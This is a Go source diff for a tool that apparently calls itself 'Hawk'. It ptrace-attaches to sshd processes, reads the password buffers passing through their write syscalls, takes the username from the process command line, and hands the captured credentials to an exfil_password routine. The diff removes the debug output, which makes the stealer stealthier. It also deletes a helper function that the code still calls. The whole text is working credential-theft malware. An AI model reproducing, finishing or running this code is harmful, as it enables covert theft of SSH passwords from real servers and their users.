@@ -4,25 +4,22 @@ import (
 	"fmt"
 	"io/ioutil"
 	"regexp"
+	"runtime"
 	"syscall"
-	"unicode"
 )
 
 func traceSSHDProcess(pid int) {
-	fmt.Printf("[Hawk] SSH Connection Identified on pid: %d.\n", pid)
-
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
 	err := syscall.PtraceAttach(pid)
 	if err != nil {
 		return
 	}
 	defer func() {
 		syscall.PtraceDetach(pid)
-		fmt.Printf("[Hawk] Detached from pid: %d.\n", pid)
 	}()
-
 	var wstatus syscall.WaitStatus
 	for {
-
 		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
 		if err != nil {
 			return
@@ -36,17 +33,17 @@ func traceSSHDProcess(pid int) {
 			var regs syscall.PtraceRegs
 			err := syscall.PtraceGetRegs(pid, &regs)
 			if err != nil {
-				fmt.Println("PtraceGetRegs:", err)
 				syscall.PtraceDetach(pid)
 				return
 			}
-			// Find some way to only find it once
+
 			if regs.Rdi == 5 && regs.Orig_rax == 1 {
 				buffer := make([]byte, regs.Rdx)
 				_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
 				if err != nil {
 					return
 				}
+
 				if len(buffer) < 250 && len(buffer) > 5 && string(buffer) != "" {
 					username := "root"
 					cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
@@ -54,13 +51,11 @@ func traceSSHDProcess(pid int) {
 					if len(matches) == 2 {
 						username = string(matches[1])
 					}
+
 					var password = removeNonPrintableAscii(string(buffer))
-					fmt.Printf("Username: %q, Password %q\n", username, password)
 					if len(password) > 2 && len(password) < 250 {
 						go exfil_password(username, removeNonPrintableAscii(password))
 					}
-				} else {
-					fmt.Printf("rdi: %d, rax: %d\n", regs.Rdi, regs.Orig_rax)
 				}
 			}
 		}
@@ -70,16 +65,4 @@ func traceSSHDProcess(pid int) {
 			return
 		}
 	}
-}
-
-func removeNonPrintableAscii(input string) string {
-	var resultBuilder []rune
-
-	for _, char := range input {
-		if unicode.IsPrint(char) && char >= 32 && char != 127 {
-			resultBuilder = append(resultBuilder, char)
-		}
-	}
-
-	return string(resultBuilder)
 }
